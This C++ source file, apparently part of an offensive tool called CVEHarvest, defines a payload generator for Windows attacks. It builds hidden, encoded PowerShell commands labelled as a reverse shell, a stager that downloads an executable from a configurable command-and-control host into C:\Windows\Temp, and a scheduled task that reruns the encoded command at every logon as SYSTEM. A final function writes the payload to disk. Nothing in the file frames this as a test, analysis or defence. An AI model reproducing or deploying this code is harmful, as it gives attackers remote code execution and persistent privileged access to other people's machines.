#include "CVEHarvest.hpp"

#include <fstream>
#include <sstream>

namespace cveh {

    std::string PayloadFactory::build_reverse_shell(const PayloadConfig& cfg) {
        std::ostringstream oss;
        oss << "powershell -nop -w hidden -enc " << cfg.command;
        return oss.str();
    }

    std::string PayloadFactory::build_stager(const PayloadConfig& cfg) {
        std::ostringstream oss;
        oss << "Invoke-WebRequest -Uri http://" << cfg.c2_host << ":" << cfg.c2_port << "/stager -OutFile C:\\Windows\\Temp\\"
            << cfg.persistence_name << ".exe";
        return oss.str();
    }

    std::string PayloadFactory::build_persistence(const PayloadConfig& cfg) {
        std::ostringstream oss;
        oss << "schtasks /create /tn " << cfg.persistence_name
            << " /tr \"powershell -nop -w hidden -enc " << cfg.command << "\" /sc onlogon /ru SYSTEM";
        return oss.str();
    }

    bool PayloadFactory::write_payload_to_disk(const std::string& payload, const std::string& output_path) {
        std::ofstream out(output_path, std::ios::binary);
        if (!out) return false;
        out << payload;
        out.close();
        return true;
    }

}
